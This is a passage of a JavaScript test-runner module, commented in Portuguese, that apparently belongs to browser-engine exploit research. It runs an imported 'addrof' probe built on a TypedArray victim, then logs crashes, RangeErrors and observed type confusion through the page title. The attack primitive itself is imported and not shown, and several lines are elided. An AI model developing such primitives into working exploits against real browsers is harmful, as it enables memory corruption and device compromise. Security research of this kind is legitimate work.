...
import { 
    executeTypedArrayVictimAddrofTest_FocusOnConfusedThis,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_FocusOnConfusedThis";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (FocusOnConfusedThis) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_FocusOnConfusedThis(); 
    ...
    if (result.errorOccurred) {
        ...
        if (result.errorOccurred.name === 'RangeError') {
            ...
            document.title = `Heisenbug (TypedArray-FCT) RangeError!`; // FCT para FocusOnConfusedThis
         } else {
            document.title = `Heisenbug (TypedArray-FCT) ERR: ${result.errorOccurred.name}`;
         }
         ...
         if (!document.title.includes("CONGELOU")) document.title = `Heisenbug (TypedArray-FCT) CRASH/FREEZE?`;
    } else {
        ...
        if (result.toJSON_details && result.toJSON_details.error_in_toJSON) {
            ...
            document.title = `Heisenbug (TypedArray-FCT) toJSON_ERR`;
            ...
            logS3(`     !!!! TYPE CONFUSION OBSERVADA NA SONDA !!!! Tipo de 'this' na última sonda: ${result.toJSON_details.this_type_in_toJSON}`, "critical", FNAME_RUNNER);
             if (result.toJSON_details.this_was_victim_ref_when_confused !== null) { // Ajustado para o nome da v4/v5
            ...
            if (result.toJSON_details.writes_attempted_on_confused_this) { // Ajustado para o nome da v5
            ...
            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
                 document.title = `Heisenbug (TypedArray-FCT) TYPE CONFUSION`;
            }
        } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT) || document.title.includes("Probing")) {
            if (!document.title.includes("SUCESSO") && !document.title.includes("Addr Falhou")) {
                 document.title = `Heisenbug (TypedArray-FCT) Test OK`;
            }
        }
    }
    ...
    logS3(`==== Estratégia de Reprodução do Heisenbug com TypedArray Vítima (FocusOnConfusedThis) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT}_MainOrchestrator`; 
    ...
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (FocusOnConfusedThis) ====`, 'test', FNAME_ORCHESTRATOR);
    ...
    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && !document.title.includes("SUCCESS") && !document.title.includes("ERR") && !document.title.includes("TYPE CONFUSION")) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_FOCUS_CT} Concluído`;
        }
    }
}
